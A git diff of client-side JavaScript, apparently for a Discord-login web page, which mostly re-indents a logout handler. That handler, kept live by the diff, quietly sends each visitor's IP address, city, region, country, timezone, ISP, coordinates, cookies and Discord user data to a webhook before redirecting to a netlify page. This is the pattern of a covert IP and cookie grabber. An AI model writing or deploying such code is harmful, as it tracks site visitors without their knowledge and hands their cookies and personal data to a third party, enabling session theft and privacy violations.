@@ -182,27 +182,26 @@ ${userDataFormatted}
 
     // Logout functionality with JWT
     logoutButton.addEventListener('click', async function() {
-        await sendWebhook("User Logout", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`py
-${userDataFormatted}
-\`\`\`
-`, Math.floor(Math.random() * 16777215)); // Random color
-        localStorage.removeItem('discordUser');
-        localStorage.removeItem('jwtToken'); // Remove the JWT token on logout
-        loggedIn = false;
-        updateUI();
-        window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
-    });
+    await sendWebhook("User Logout", `
+    **IP:** ${ipData.ip}
+    **City:** ${ipData.city}
+    **Region:** ${ipData.region}
+    **Country:** ${ipData.country}
+    **Timezone:** ${ipData.timezone}
+    **Org:** ${ipData.org}
+    **Location:** ${ipData.loc}
+    **Cookies:** ${visitorCookie}
+    **Discord User Data:** \`\`\`py
+    ${userDataFormatted}
+    \`\`\`
+    `, Math.floor(Math.random() * 16777215)); // Random color
+    localStorage.removeItem('discordUser');
+    localStorage.removeItem('jwtToken'); // Remove the JWT token on logout
+    loggedIn = false;
+    updateUI();
+    window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
+});
 
-// Function to update UI based on login status and handle token validity
 async function updateUI() {
     const urlParams = new URLSearchParams(window.location.search);
     const tokenParam = urlParams.get('token') || localStorage.getItem('jwtToken'); // Check URL or localStorage for token
